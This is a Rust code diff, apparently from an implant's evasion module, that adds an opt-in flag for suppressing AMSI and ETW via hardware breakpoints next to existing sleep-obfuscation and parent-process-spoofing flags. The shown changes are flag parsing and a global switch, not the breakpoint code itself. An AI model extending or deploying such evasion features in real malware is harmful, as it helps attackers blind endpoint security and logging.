@@ -50,6 +50,13 @@ pub fn register_sensitive(ptr: usize, len: usize) {
     }
 }
 
+static HWBP_REQUESTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
+
+/// Whether the operator opted into ABR-T036 (`--evasion ...hwbp`).
+pub fn hwbp_requested() -> bool {
+    HWBP_REQUESTED.load(std::sync::atomic::Ordering::Relaxed)
+}
+
 /// Snapshot of the registered regions (called by the sleep cycle).
 pub(crate) fn sensitive_regions() -> Vec<(usize, usize)> {
     SENSITIVE.lock().map(|r| r.clone()).unwrap_or_default()
@@ -61,6 +68,13 @@ use std::time::Duration;
 pub struct Flags {
     pub ekko_sleep: bool,
     pub spoofed_parent: bool,
+    /// Opt-in ABR-T036 (AMSI/ETW via hardware breakpoints). Off by
+    /// default: every measured environment so far (VBS host, hypervisor
+    /// guest) discards user debug-register writes, and the arm path
+    /// regressed CLR tasks inside the full implant on the virtualized
+    /// lab even where the isolated tests pass — opt in only on hosts
+    /// known to honor DR writes.
+    pub hwbp_suppression: bool,
 }
 
 impl Flags {
@@ -70,11 +84,13 @@ impl Flags {
         let mut flags = Flags {
             ekko_sleep: false,
             spoofed_parent: false,
+            hwbp_suppression: false,
         };
         for name in spec.split(',').map(str::trim).filter(|s| !s.is_empty()) {
             match name {
                 "ekko" => flags.ekko_sleep = true,
                 "ppid" => flags.spoofed_parent = true,
+                "hwbp" => flags.hwbp_suppression = true,
                 other => return Err(format!("unknown evasion flag '{other}'")),
             }
         }
@@ -94,6 +110,7 @@ impl Evasion {
             flags: Flags {
                 ekko_sleep: false,
                 spoofed_parent: false,
+                hwbp_suppression: false,
             },
             ekko: None,
             spawner: None,
@@ -122,6 +139,15 @@ impl Evasion {
 
     pub fn spoofed_parent(&self) -> bool {
         self.flags.spoofed_parent
+    }
+
+    /// Publishes the hwbp opt-in for the CLR task path (called once at
+    /// enable time).
+    pub fn publish(&self) {
+        HWBP_REQUESTED.store(
+            self.flags.hwbp_suppression,
+            std::sync::atomic::Ordering::Relaxed,
+        );
     }
 
     pub fn sleep(&self, duration: Duration) {
